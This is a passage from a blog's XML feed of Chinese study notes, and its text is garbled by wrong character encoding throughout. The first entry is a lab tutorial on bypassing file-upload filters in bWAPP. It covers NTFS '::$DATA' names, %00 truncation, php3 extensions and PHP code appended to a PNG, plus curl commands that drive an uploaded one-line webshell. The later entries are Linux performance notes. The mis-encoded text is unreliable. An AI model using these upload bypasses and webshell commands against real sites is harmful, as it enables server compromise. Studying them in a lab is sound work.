è®ºæ˜¯.txtè¿˜æ˜¯.jpg|.exe|.aspéƒ½è¡Œï¼›b.txtä¹Ÿå¯ä»¥ä»»æ„æŒ‡å®šæ–‡ä»¶åä»¥åŠåç¼€åã€‚ï¼ˆå¯ä»¥å°†ä»»æ„æ–‡æœ¬ä¿¡æ¯éšè—äºä»»æ„æ–‡ä»¶ä¸­ï¼Œåªè¦ä¸æ³„éœ²å†’å·åçš„è™šæ‹Ÿæ–‡ä»¶å(å³b.txt)ï¼Œåˆ«äººæ˜¯æ ¹æœ¬ä¸ä¼šæŸ¥çœ‹åˆ°éšè—ä¿¡æ¯çš„ï¼‰<br>3ï¼‰åŒ…å«éšè—ä¿¡æ¯çš„æ–‡ä»¶ä»ç„¶å¯ä»¥ç»§ç»­éšè—å…¶å®ƒçš„å†…å®¹ï¼Œå¯¹æ¯”ä¸Šä¾‹ï¼Œæˆ‘ä»¬ä»ç„¶å¯ä»¥ä½¿ç”¨å‘½ä»¤echo 12345&gt;&gt;a.txt:c.txtã€€ç»™a.txtå»ºç«‹æ–°çš„éšè—ä¿¡æ¯çš„æµæ–‡ä»¶ï¼Œä½¿ç”¨å‘½ä»¤notepad a.txt:c.txtã€€æ‰“å¼€åä¼šå‘ç°12345è¿™æ®µä¿¡æ¯ï¼Œè€Œabcdeä»ç„¶å­˜åœ¨äºa.txt:b.txtä¸­ä¸æ¯«ä¸å—å½±å“ã€‚<br>å½“æˆ‘ä»¬è®¿é—®a.asp::$DATA æ—¶ï¼Œå°±æ˜¯è¯·æ±‚ a.asp æœ¬èº«çš„æ•°æ®ï¼Œå¦‚æœa.asp è¿˜åŒ…å«äº†å…¶ä»–çš„æ•°æ®æµï¼Œæ¯”å¦‚ a.asp:lake2.aspï¼Œè¯·æ±‚ a.asp:lake2.asp::$DATAï¼Œåˆ™æ˜¯è¯·æ±‚a.aspä¸­çš„æµæ•°æ®lake2.aspçš„æµæ•°æ®å†…å®¹ã€‚<br>ä¾‹å¦‚å½“.phpåç¼€å½“æ–‡ä»¶ç±»å‹è¢«é»‘åå•é™åˆ¶æ—¶ï¼Œå¯ä»¥é€šè¿‡æ‹¦æˆªæ•°æ®åŒ…ï¼Œå°†æ–‡ä»¶åä¿®æ”¹ä¸ºshell.php::$DATAå½“æ–¹å¼è¿›è¡Œç»•è¿‡ã€‚</p><h2 id="5ã€-00é˜¶æ®µç»•è¿‡"><a href="#5ã€-00é˜¶æ®µç»•è¿‡" class="headerlink" title="5ã€%00é˜¶æ®µç»•è¿‡"></a>5ã€%00é˜¶æ®µç»•è¿‡</h2><p>å¦‚æœåç«¯åœ¨å¤„ç†ä¸Šä¼ æ–‡ä»¶çš„ä¿å­˜è¿‡ç¨‹ï¼Œæ˜¯ä»¥è·¯å¾„æ‹¼æ¥çš„æ–¹å¼ï¼Œä¸”è·¯å¾„æ˜¯ä»å‰ç«¯è·å–ï¼Œå°±å¯ä»¥é‡‡å–è·¯å¾„æˆªæ–­çš„æ–¹å¼ç»•è¿‡ç™½åå•ã€‚å…·ä½“æ‰‹æ³•æ˜¯åˆ©ç”¨burpsuiteï¼Œåœ¨æˆ‘ä»¬æƒ³è¦æˆªæ–­çš„ä½ç½®ï¼Œè¿›å…¥åå…­è¿›åˆ¶ï¼Œæ·»åŠ 00æˆªæ–­ç¬¦å·ã€‚å…·ä½“å®ç°è§å®æˆ˜æ¨¡æ‹Ÿã€‚</p><h2 id="6ã€æ–‡ä»¶å¤´æ£€æµ‹ç»•è¿‡"><a href="#6ã€æ–‡ä»¶å¤´æ£€æµ‹ç»•è¿‡" class="headerlink" title="6ã€æ–‡ä»¶å¤´æ£€æµ‹ç»•è¿‡"></a>6ã€æ–‡ä»¶å¤´æ£€æµ‹ç»•è¿‡</h2><p>æ¯ç§æ–‡ä»¶å¤´æ ¼å¼éƒ½æœ‰å¯¹åº”çš„åå…­è¿›åˆ¶å’Œè‡ªè´Ÿçš„ç¼–ç å½¢å¼ã€‚æ¯”å¦‚pngæ ¼å¼çš„æ–‡ä»¶å¤´æ ‡è¯†ç¬¦æ˜¯89 50 4E 47ï¼Œgitæ ¼å¼çš„æ–‡ä»¶å¤´æ ‡è¯†ç¬¦æ˜¯47 49 46 38ã€‚åœ¨é¢å¯¹å…·æœ‰æ–‡ä»¶å†…å®¹æ£€æµ‹çš„ä¸Šä¼ åŠŸèƒ½æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥å°†æ”»å‡»ä»£ç å’Œå›¾ç‰‡ç­‰æ–‡ä»¶è¿›è¡Œèšåˆï¼Œå®ç°æ—¢æ»¡è¶³æ–‡ä»¶å¤´æ£€æµ‹ï¼Œåˆå¯æˆåŠŸæ‰§è¡Œä»£ç çš„æ•ˆæœã€‚</p><h2 id="7ã€æ–‡ä»¶ä¸Šä¼ æºç å®¡è®¡"><a href="#7ã€æ–‡ä»¶ä¸Šä¼ æºç å®¡è®¡" class="headerlink" title="7ã€æ–‡ä»¶ä¸Šä¼ æºç å®¡è®¡"></a>7ã€æ–‡ä»¶ä¸Šä¼ æºç å®¡è®¡</h2><p>é€»è¾‘ä»£ç å®‰å…¨æ€§&amp;è°ƒç”¨å‡½æ•°å®‰å…¨æ€§</p><h2 id="8ã€Fuzz"><a href="#8ã€Fuzz" class="headerlink" title="8ã€Fuzz"></a>8ã€Fuzz</h2><p>burpsuite â€”â€” send to intruder<br>éœ€è¦å‡†å¤‡å­—å…¸ </p><h1 id="å®æˆ˜æ¨¡æ‹Ÿ"><a href="#å®æˆ˜æ¨¡æ‹Ÿ" class="headerlink" title="å®æˆ˜æ¨¡æ‹Ÿ"></a>å®æˆ˜æ¨¡æ‹Ÿ</h1><h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><pre><code class="hljs plain"># ç¬¬ä¸€æ¬¡å¯åŠ¨docker pull registry.cn-shanghai.aliyuncs.com&#x2F;yhskc&#x2F;bwappdocker run -d -p 0.0.0.0:80:80 registry.cn-shanghai.aliyuncs.com&#x2F;yhskc&#x2F;bwapp# æ ¹æ®è¯¾ç¨‹ä¸­çš„æ¼”ç¤ºæ­å»ºå¥½ bWAPP å®éªŒç¯å¢ƒåï¼Œä»¥åå†å¯åŠ¨ bWAPPdocker container list -a # æŸ¥çœ‹ container iddocker start xxx # xxx å°±æ˜¯ä¸Šä¸€æ­¥è·å¾—çš„ container idï¼Œè¿è¡Œå®Œè¿™æ¡å‘½ä»¤åï¼Œè®¿é—®å“åº”çš„ç½‘å€å³å¯</code></pre><h2 id="ä¸€å¥è¯æœ¨é©¬ä¸Šä¼ "><a href="#ä¸€å¥è¯æœ¨é©¬ä¸Šä¼ " class="headerlink" title="ä¸€å¥è¯æœ¨é©¬ä¸Šä¼ "></a>ä¸€å¥è¯æœ¨é©¬ä¸Šä¼ </h2><p>åˆå§‹åŒ–bwappï¼Œè¿‡ç¨‹çœç•¥ï¼Œé€‰æ‹©æ–‡ä»¶ä¸Šä¼ æ¼æ´ Unrestricted File Uploadï¼ŒæŒ‰ä¸‹å›¾æ“ä½œï¼Œä¸Šä¼ ä¸€å¥è¯æœ¨é©¬æ–‡ä»¶ï¼Œå¹¶å¤åˆ¶ä¸Šä¼ åæœåŠ¡å™¨è¿”å›çš„æ–‡ä»¶ä¿å­˜åœ°å€<br><img src="/img/fileupload1.gif" srcset="/img/loading.gif" alt="fileupload"><br>æ„é€ ä¸€å¥è¯æœ¨é©¬ï¼Œåœ¨POSTè¯·æ±‚çš„hackerå­—æ®µä¸­å†™å…¥æˆ‘ä»¬å¸Œæœ›æœåŠ¡å™¨æ‰§è¡Œçš„ä»£ç ï¼Œåˆ©ç”¨curlå·¥å…·æ„é€ postè¯·æ±‚ï¼š</p><pre><code class="hljs plain">curl -d &quot;hacker&#x3D;echo get_current_user();&quot; http:&#x2F;&#x2F;127.0.0.1:8888&#x2F;images&#x2F;shell.phpcurl -d &quot;hacker&#x3D;echo getcwd();&quot; http:&#x2F;&#x2F;127.0.0.1:8888&#x2F;images&#x2F;shell.php</code></pre><p>æ­¤å¤„ä»‹ç»ä¸¤ä¸ªphp api<br>get_current_user()ï¼šè·å–æœåŠ¡æ‰€å±ç”¨æˆ·å<br>getcwd()ï¼šè·å–å½“å‰æ‰§è¡Œç›®å½•<br>æ“ä½œè§ä¸‹å›¾ï¼ŒæœåŠ¡å™¨æˆåŠŸè¿”å›äº†ç”¨æˆ·åwww-dataåŠå½“å‰æ‰§è¡Œç›®å½•/app/images</p><p><img src="/img/fileupload2.gif" srcset="/img/loading.gif" alt="fileupload"></p><h2 id="æ–‡ä»¶ååç¼€ç»•è¿‡"><a href="#æ–‡ä»¶ååç¼€ç»•è¿‡" class="headerlink" title="æ–‡ä»¶ååç¼€ç»•è¿‡"></a>æ–‡ä»¶ååç¼€ç»•è¿‡</h2><p>å°†æ–‡ä»¶ä¸Šä¼ ç­‰çº§è®¾ç½®ä¸º mediumï¼Œä¸Šä¼ æ–‡ä»¶åç¼€ä¸ºphpæ—¶ï¼Œæ˜¾ç¤ºè¢«æ‹¦æˆªï¼Œå¦‚ä¸‹ï¼š<br><img src="/img/hz.gif" srcset="/img/loading.gif" alt="fileupload"><br>å°†shell.phpæ–‡ä»¶åç¼€ä¿®æ”¹ä¸ºphp3å’Œphp30ï¼Œä¸Šä¼ php3åç¼€æ–‡ä»¶æ—¶ï¼Œå¯æˆåŠŸç»•è¿‡åç¼€åé™åˆ¶<br><img src="/img/hz3.png" srcset="/img/loading.gif" alt="fileupload"><br>ä¸Šä¼ shell.php30æ–‡ä»¶ï¼ŒæœåŠ¡å™¨å°†æ–‡ä»¶å½“ä½œtxtæ–‡æœ¬è¿›è¡Œäº†å¤„ç†ï¼Œç›´æ¥æ‰“å°äº†æ–‡ä»¶å†…å®¹<br><img src="/img/hz.png" srcset="/img/loading.gif" alt="fileupload"><br>é€šè¿‡web serverçš„é…ç½®æ–‡ä»¶ï¼Œæ¢ç©¶æ–‡ä»¶åç»•è¿‡çš„åŸç†ï¼›bwappä½¿ç”¨çš„web serveræ˜¯apacheï¼Œé€šè¿‡é…ç½®æ–‡ä»¶å¯ä»¥äº†è§£åˆ°apacheçš„è¯­è¨€è§£ææ¨¡å—æ–‡ä»¶è·¯å¾„</p><pre><code class="hljs plain">vim &#x2F;etc&#x2F;apache2&#x2F;apache2.conf</code></pre><p><img src="/img/apcf.png" srcset="/img/loading.gif" alt="fileupload"><br>è¿›å…¥å¯¹åº”çš„è¯­è¨€è§£ææ¨¡å—é…ç½®æ–‡ä»¶ï¼š</p><pre><code class="hljs plain">vim &#x2F;etc&#x2F;apache2&#x2F;mods-enabled&#x2F;php5.conf</code></pre><p><img src="/img/phpconf.png" srcset="/img/loading.gif" alt="fileupload"><br>é€šè¿‡é…ç½®æ–‡ä»¶å¯å‘ç°ï¼Œphpã€php3ã€php5ã€phptmlç­‰æ–‡ä»¶åç¼€éƒ½å¯ä»¥è¢«apacheæœåŠ¡å™¨è§£æï¼Œè¿™ä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆåˆšåˆšä¸Šä¼ çš„php3æ–‡ä»¶å¯è¢«æ‰§è¡Œï¼Œphp30ä¸èƒ½è¢«æ‰§è¡Œçš„åŸå› ã€‚äº†è§£äº†æ–‡ä»¶ååç¼€çš„ç»•è¿‡åŸç†ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ä¸Šä¼ ä¸åŒçš„åç¼€åæ–‡ä»¶æ¥è¾¾åˆ°æ–‡ä»¶åç¼€åé™åˆ¶ç»•è¿‡çš„ç›®çš„ã€‚</p><h2 id="00æˆªæ–­ç»•è¿‡"><a href="#00æˆªæ–­ç»•è¿‡" class="headerlink" title="%00æˆªæ–­ç»•è¿‡"></a>%00æˆªæ–­ç»•è¿‡</h2><p>é¦–å…ˆä¸Šä¼ shell.php.jpgï¼Œæ–‡ä»¶å¯æˆåŠŸä¸Šä¼ ã€‚<br><img src="/img/jieduan2.png" srcset="/img/loading.gif" alt="fileupload"><br><img src="/img/jieduan1.png" srcset="/img/loading.gif" alt="fileupload"><br>ç”±äºè¿™ä¸ªä¸Šä¼ ç‚¹çš„æ–‡ä»¶è·¯å¾„å’Œæ–‡ä»¶åå¯æ§ï¼Œå› æ­¤è€ƒè™‘åœ¨phpåè¿›è¡Œæˆªæ–­ï¼Œå®ç°æˆ‘ä»¬è¦ä¸Šä¼ çš„æ–‡ä»¶ç±»å‹ï¼ŒåŒæ—¶æ»¡è¶³æ–‡ä»¶ç±»å‹æ ¡éªŒã€‚<br>é¦–å…ˆåˆ©ç”¨burpsuiteæ‹¦æˆªä¸Šä¼ è¯·æ±‚ï¼Œåˆ©ç”¨16è¿›åˆ¶è¾“å…¥æ–‡ä»¶æˆªæ–­ç¬¦ 00ï¼Œå› ä¸ºé”®ç›˜è¾“å…¥ä¸äº†è¿™ä¸ªç¬¦å·ï¼›åŒæ—¶ä¾¿äºæŸ¥æ‰¾ä½ç½®ï¼Œæˆ‘ä»¬è¾“å…¥ ç©ºæ ¼ï¼ˆ16è¿›åˆ¶æ•°æ˜¯20ï¼‰ï¼Œä¾¿äºæŸ¥æ‰¾éœ€è¦ä¿®æ”¹çš„ä½ç½®ã€‚å°† ç©ºæ ¼20 ä¿®æ”¹ä¸º 00è¿›è¡Œæˆªæ–­ã€‚å¯å‘ç°ç©ºæ ¼æ¶ˆå¤±ï¼ŒåŒæ—¶åœ¨pngåé¢ç§»åŠ¨å…‰æ ‡æ—¶ä¼šå‘ç°å­˜åœ¨ä¸€ä¸ªéšè—å­—ç¬¦ï¼Œå³éœ€è¦ç§»åŠ¨ä¸¤æ¬¡æ‰åˆ°è¾¾ .jpg ä½ç½®ã€‚<br><img src="/img/jieduan3.png" srcset="/img/loading.gif" alt="fileupload"><br><img src="/img/jieduan4.png" srcset="/img/loading.gif" alt="fileupload"><br><img src="/img/jieduan5.png" srcset="/img/loading.gif" alt="fileupload"><br><img src="/img/jieduan6.png" srcset="/img/loading.gif" alt="fileupload"><br>å–æ¶ˆburpsuiteæ‹¦æˆªï¼Œæ–‡ä»¶æˆåŠŸä¸Šä¼ ï¼Œç‚¹å‡»hereæŸ¥çœ‹ï¼Œæ–‡ä»¶åè¢«æˆåŠŸæˆªæ–­ä¸”ä¿®æ”¹ä¸ºshell.png<br><img src="/img/jieduan7.png" srcset="/img/loading.gif" alt="fileupload"></p><h2 id="æ–‡ä»¶å¤´æ£€æµ‹ç»•è¿‡"><a href="#æ–‡ä»¶å¤´æ£€æµ‹ç»•è¿‡" class="headerlink" title="æ–‡ä»¶å¤´æ£€æµ‹ç»•è¿‡"></a>æ–‡ä»¶å¤´æ£€æµ‹ç»•è¿‡</h2><p>ä»¥phpè¯­è¨€ä¸ºä¾‹ï¼Œé¦–å…ˆå‡†å¤‡ä¸€ä¸ªæ™®é€šçš„pngæ ¼å¼æ–‡ä»¶ï¼ŒæŸ¥çœ‹æ–‡ä»¶å†…å®¹ï¼Œæ–‡ä»¶å¤´æ ‡å¿—ç¬¦å·æ˜¯å®Œæ•´çš„ï¼š<br><img src="/img/filehead.png" srcset="/img/loading.gif" alt="fileupload"><br>å†å‡†å¤‡ä¸€ä¸ªç”¨äºæµ‹è¯•çš„phpæ–‡ä»¶ï¼ŒåŠŸèƒ½æ˜¯è¾“å‡ºâ€˜testâ€™å­—ç¬¦ä¸²ï¼š<br><img src="/img/filehead2.png" srcset="/img/loading.gif" alt="fileupload"><br>å°†phpæ–‡ä»¶å†…å®¹è¿½åŠ åˆ°pngæ–‡ä»¶å†…ï¼š</p><pre><code class="hljs plain">cat test.php &gt;&gt; filetype.png</code></pre><p><img src="/img/filehead3.png" srcset="/img/loading.gif" alt="fileupload"><br>åˆ©ç”¨phpï¼Œè§£æpngæ–‡ä»¶ï¼Œphpä»£ç è¢«æˆåŠŸæ‰§è¡Œï¼Œè¯´æ˜æˆ‘ä»¬å¯ä»¥é€šè¿‡æŠŠå›¾ç‰‡å’Œä»£ç è¿›è¡Œèšåˆçš„æ–¹å¼ï¼Œè®©å®ƒæ—¢æ»¡è¶³æ–‡ä»¶å¤´çš„æ ‡å‡†æ ¡éªŒï¼Œåˆæ»¡è¶³ä»£ç çš„æ‰§è¡Œã€‚<br><img src="/img/filehead4.png" srcset="/img/loading.gif" alt="fileupload"></p>]]></content>
    
    
    <categories>
      
      <category>Webå®‰å…¨</category>
      
      <category>æ–‡ä»¶ä¸Šä¼ æ¼æ´</category>
      
    </categories>
    
    
    <tags>
      
      <tag>å®‰å…¨</tag>
      
      <tag>Webå®‰å…¨</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ã€ŠLinuxæ€§èƒ½ä¼˜åŒ–å®æˆ˜ã€‹å­¦ä¹ æ€»ç»“ï¼š1-8è®²</title>
    <link href="/2020/11/20/%E3%80%8ALinux%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96%E5%AE%9E%E6%88%98%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%9A1-8%E8%AE%B2/"/>
    <url>/2020/11/20/%E3%80%8ALinux%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96%E5%AE%9E%E6%88%98%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%9A1-8%E8%AE%B2/</url>
    
    <content type="html"><![CDATA[<p>uptimeï¼šè·å–å½“å‰æ—¶é—´ã€ç³»ç»Ÿè¿è¡Œæ—¶é—´ã€ç™»å½•ç”¨æˆ·æ•°ã€å¹³å‡è´Ÿè½½<br>å¹³å‡è´Ÿè½½ï¼šå•ä½æ—¶é—´å†…ï¼Œç³»ç»Ÿå¤„äºå¯è¿è¡ŒçŠ¶æ€å’Œä¸å¯ä¸­æ–­çŠ¶æ€çš„å¹³å‡è¿›ç¨‹æ•°ï¼Œå³å¹³å‡æ´»è·ƒè¿›ç¨‹æ•°<br>è·å–CPUæ ¸æ•°ï¼š<br>top<br>grep â€˜model nameâ€™ /proc/cpuinfo | wc -l<br>è´Ÿè½½è¿‡é«˜ï¼šå¹³å‡è´Ÿè½½&gt;CPUæ•°é‡*70%<br>pidstat -u 5 1ï¼šæŸ¥çœ‹è¿›ç¨‹çš„cpuä½¿ç”¨æƒ…å†µï¼ˆæ¯5sè¾“å‡ºä¸€ç»„æ•°æ®ï¼‰</p><p>Linuxå¤šä»»åŠ¡ï¼šlinuxç³»ç»Ÿåœ¨å¾ˆçŸ­æ—¶é—´å†…ï¼Œå°†cpuè½®æµåˆ†é…ç»™å¤šä¸ªä»»åŠ¡ï¼Œé€ æˆå¤šä»»åŠ¡åŒæ—¶è¿è¡Œçš„é”™è§‰<br>CPUå¯„å­˜å™¨ï¼šCPUå†…ç½®çš„å°å®¹é‡ã€é€Ÿåº¦æå¿«çš„å†…å­˜<br>ç¨‹åºè®¡æ•°å™¨ï¼šå­˜å‚¨CPUæ­£åœ¨æ‰§è¡Œçš„æŒ‡ä»¤ä½ç½®ã€æˆ–å³å°†æ‰§è¡Œçš„ä¸‹ä¸€æŒ‡ä»¤çš„ä½ç½®<br>CPUä¸Šä¸‹æ–‡ï¼šCPUå¯„å­˜å™¨å’Œç¨‹åºè®¡æ•°å™¨<br>CPUä¸Šä¸‹æ–‡åˆ‡æ¢ï¼šæŠŠå‰ä¸€ä»»åŠ¡çš„CPUä¸Šä¸‹æ–‡ä¿å­˜åœ¨å†…æ ¸ï¼Œåœ¨ä»»åŠ¡é‡æ–°è°ƒåº¦æ—¶å†åŠ è½½åˆ°CPUï¼›ç„¶ååŠ è½½æ–°ä»»åŠ¡çš„ä¸Šä¸‹æ–‡ï¼Œå¹¶è·³è½¬åˆ°ç¨‹åºè®¡æ•°å™¨æ‰€æŒ‡çš„æ–°ä½ç½®ï¼Œè¿è¡Œæ–°ä»»åŠ¡<br>1ï¼‰è¿›ç¨‹ä¸Šä¸‹æ–‡åˆ‡æ¢ï¼š<br>è¿›ç¨‹åœ¨ç”¨æˆ·ç©ºé—´è¿è¡Œæ—¶è¢«ç§°ä¸ºè¿›ç¨‹çš„ç”¨æˆ·æ€ï¼Œé™·å…¥å†…æ ¸ç©ºé—´çš„æ—¶è¢«ç§°ä¸ºè¿›ç¨‹çš„å†…æ ¸æ€ï¼›<br>è¿›ç¨‹ä»ç”¨æˆ·æ€åˆ°å†…æ ¸æ€çš„è½¬å˜ï¼Œæ˜¯é€šè¿‡å†…æ ¸çš„ç³»ç»Ÿè°ƒç”¨ï¼Œåœ¨åŒä¸€ä¸ªè¿›ç¨‹è¿è¡Œï¼Œç§°ä¸ºç‰¹æƒæ¨¡å¼åˆ‡æ¢ï¼›<br>è¿›ç¨‹ä¸Šä¸‹æ–‡åˆ‡æ¢éœ€è¦å†…æ ¸åœ¨CPUä¸Šè¿è¡Œï¼Œä»ä¸€ä¸ªè¿›ç¨‹åˆ‡æ¢åˆ°å¦ä¸€ä¸ªè¿›ç¨‹ï¼›<br>2ï¼‰çº¿ç¨‹ä¸Šä¸‹æ–‡åˆ‡æ¢ï¼š<br>çº¿ç¨‹æ˜¯è°ƒåº¦çš„åŸºæœ¬å•ä½ï¼Œè€Œè¿›ç¨‹åˆ™æ˜¯èµ„æºæ‹¥æœ‰çš„åŸºæœ¬å•ä½ï¼›<br>å‰åä¸¤ä¸ªçº¿ç¨‹å±äºä¸åŒè¿›ç¨‹æ—¶èµ„æºä¸å…±äº«ï¼Œåˆ‡æ¢è¿‡ç¨‹å’Œè¿›ç¨‹ä¸Šä¸‹æ–‡åˆ‡æ¢ä¸€æ ·ï¼›<br>å‰åä¸¤ä¸ªçº¿ç¨‹å±äºåŒä¸€ä¸ªè¿›ç¨‹æ—¶ï¼Œå› ä¸ºè™šæ‹Ÿå†…å­˜æ˜¯å…±äº«çš„ï¼Œæ‰€ä»¥åœ¨åˆ‡æ¢æ—¶ï¼Œè™šæ‹Ÿå†…å­˜è¿™äº›èµ„æºä¿æŒä¸åŠ¨ï¼Œåªéœ€åˆ‡æ¢çº¿ç¨‹çš„ç§æœ‰æ•°æ®ã€å¯„å­˜å™¨ç­‰ä¸å…±äº«çš„æ•°æ®ã€‚<br>3ï¼‰ä¸­æ–­ä¸Šä¸‹æ–‡åˆ‡æ¢ï¼š<br>ä¸ºäº†å¿«é€Ÿå“åº”ç¡¬ä»¶çš„äº‹ä»¶ï¼Œä¸­æ–­å¤„ç†ä¼šæ‰“æ–­è¿›ç¨‹çš„æ­£å¸¸è°ƒåº¦å’Œæ‰§è¡Œï¼Œè½¬è€Œè°ƒç”¨ä¸­æ–­å¤„ç†ç¨‹åºï¼Œå“åº”è®¾å¤‡äº‹ä»¶ã€‚åœ¨ä¸­æ–­å…¶ä»–è¿›ç¨‹æ—¶ï¼Œéœ€è¦ä¿å­˜å½“å‰è¿›ç¨‹çš„çŠ¶æ€ï¼Œä½†ä¸åŒ…æ‹¬ç”¨æˆ·æ€ä¿¡æ¯ã€‚å¯¹åŒä¸€ä¸ª CPU æ¥è¯´ï¼Œä¸­æ–­å¤„ç†æ¯”è¿›ç¨‹æ‹¥æœ‰æ›´é«˜çš„ä¼˜å…ˆçº§</p><p>CPUä¸Šä¸‹æ–‡åˆ‡æ¢æƒ…å†µæŸ¥çœ‹ï¼švmstatã€pidstat<br>csï¼ˆcontext switchï¼‰æ˜¯æ¯ç§’ä¸Šä¸‹æ–‡åˆ‡æ¢çš„æ¬¡æ•°ã€‚<br>inï¼ˆinterruptï¼‰åˆ™æ˜¯æ¯ç§’ä¸­æ–­çš„æ¬¡æ•°ã€‚<br>rï¼ˆRunning or Runnableï¼‰æ˜¯å°±ç»ªé˜Ÿåˆ—çš„é•¿åº¦ï¼Œä¹Ÿå°±æ˜¯æ­£åœ¨è¿è¡Œå’Œç­‰å¾…CPUçš„è¿›ç¨‹æ•°ã€‚<br>bï¼ˆBlockedï¼‰åˆ™æ˜¯å¤„äºä¸å¯ä¸­æ–­ç¡çœ çŠ¶æ€çš„è¿›ç¨‹æ•°ã€‚<br>è‡ªæ„¿ä¸Šä¸‹æ–‡åˆ‡æ¢ï¼šæŒ‡è¿›ç¨‹æ— æ³•è·å–æ‰€éœ€èµ„æºï¼Œå¯¼è‡´çš„ä¸Šä¸‹æ–‡åˆ‡æ¢ã€‚å¦‚ï¼Œ I/Oã€å†…å­˜ç­‰ç³»ç»Ÿèµ„æºä¸è¶³æ—¶ï¼Œå°±ä¼šå‘ç”Ÿè‡ªæ„¿ä¸Šä¸‹æ–‡åˆ‡æ¢ã€‚<br>éè‡ªæ„¿ä¸Šä¸‹æ–‡åˆ‡æ¢ï¼šæŒ‡è¿›ç¨‹ç”±äºæ—¶é—´ç‰‡å·²åˆ°ç­‰åŸå› ï¼Œè¢«ç³»ç»Ÿå¼ºåˆ¶è°ƒåº¦ï¼Œè¿›è€Œå‘ç”Ÿçš„ä¸Šä¸‹æ–‡åˆ‡æ¢ã€‚å¦‚è¯´ï¼Œå¤§é‡è¿›ç¨‹éƒ½åœ¨äº‰æŠ¢ CPU æ—¶ï¼Œå°±å®¹æ˜“å‘ç”Ÿéè‡ªæ„¿ä¸Šä¸‹æ–‡åˆ‡æ¢ã€‚</p><p>å¹³å‡CPUä½¿ç”¨ç‡=1-ï¼ˆä¸€æ®µæ—¶é—´å†…ç©ºé—²æ—¶é—´å·®å€¼ï¼‰/ï¼ˆä¸€æ®µæ—¶é—´å†…æ€»CPUæ—¶é—´å·®å€¼ï¼‰<br>è¿›ç¨‹çŠ¶æ€ï¼š<br>è¿›ç¨‹æœ‰Rï¼ˆæ­£åœ¨/ç­‰å¾…è¿è¡Œï¼‰ã€Dï¼ˆä¸å¯ä¸­æ–­ç¡çœ ï¼‰ã€Zï¼ˆåƒµå°¸è¿›ç¨‹ï¼‰ã€Sï¼ˆå¯ä¸­æ–­ç¡çœ ï¼‰ã€Iï¼ˆç©ºé—²çŠ¶æ€ï¼‰ã€Tï¼ˆæš‚åœæˆ–è·Ÿè¸ªï¼‰ã€Xï¼ˆæ­»äº¡è¿›ç¨‹ï¼‰ä¸ƒä¸ªçŠ¶æ€<br>å…¶ä¸­ï¼Œä¸å¯ä¸­æ–­çŠ¶æ€ï¼Œè¡¨ç¤ºè¿›ç¨‹æ­£åœ¨è·Ÿç¡¬ä»¶äº¤äº’ï¼Œä¸ºäº†ä¿æŠ¤è¿›ç¨‹æ•°æ®å’Œç¡¬ä»¶çš„ä¸€è‡´æ€§ï¼Œç³»ç»Ÿä¸å…è®¸å…¶ä»–è¿›<br>ç¨‹æˆ–ä¸­æ–­æ‰“æ–­è¿™ä¸ªè¿›ç¨‹ã€‚è¿›ç¨‹é•¿æ—¶é—´å¤„äºä¸å¯ä¸­æ–­çŠ¶æ€ï¼Œé€šå¸¸è¡¨ç¤ºç³»ç»Ÿæœ‰ I/O æ€§èƒ½é—®é¢˜ã€‚<br>åƒµå°¸è¿›ç¨‹è¡¨ç¤ºè¿›ç¨‹å·²ç»é€€å‡ºï¼Œä½†å®ƒçš„çˆ¶è¿›ç¨‹è¿˜æ²¡æœ‰å›æ”¶å­è¿›ç¨‹å ç”¨çš„èµ„æºã€‚<br>ç›¸å…³è”çš„è¿›ç¨‹ä½¿ç”¨è¿›ç¨‹ç»„å’Œä¼šè¯è¿›è¡Œç®¡ç†</p><p>iowaitè¿‡é«˜æ’æŸ¥ï¼š dstatã€pidstat ç­‰å·¥å…·ï¼Œç¡®è®¤æ˜¯å¦ç£ç›˜ I/O çš„é—®é¢˜ã€‚å†ä½¿ç”¨ps å‘½ä»¤æ‰¾åˆ°çš„ D çŠ¶æ€ï¼ˆå³ä¸å¯ä¸­æ–­çŠ¶æ€ï¼‰çš„è¿›ç¨‹ï¼ŒæŸ¥çœ‹æ˜¯å¦æ˜¯è¿™äº›è¿›ç¨‹å¯¼è‡´ç­‰å¾…I/O<br>åƒµå°¸è¿›ç¨‹æ’æŸ¥ï¼šä½¿ç”¨ pstree æ‰¾å‡ºçˆ¶è¿›ç¨‹åï¼Œå»æŸ¥çœ‹çˆ¶è¿›ç¨‹çš„ä»£ç ï¼Œæ£€æŸ¥ wait() /waitpid() çš„è°ƒç”¨ï¼Œæˆ–æ˜¯ SIGCHLD ä¿¡å·å¤„ç†å‡½æ•°çš„æ³¨å†Œ</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
      <category>CPU</category>
      
      <category>è¿›ç¨‹</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ã€Šè¶£è°ˆç½‘ç»œåè®®ã€‹å­¦ä¹ æ€»ç»“ï¼š37-39è®²</title>
    <link href="/2020/11/14/%E3%80%8A%E8%B6%A3%E8%B0%88%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%9A37-39%E8%AE%B2/"/>
    <url>/2020/11/14/%E3%80%8A%E8%B6%A3%E8%B0%88%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%9A37-39%E8%AE%B2/</url>
    
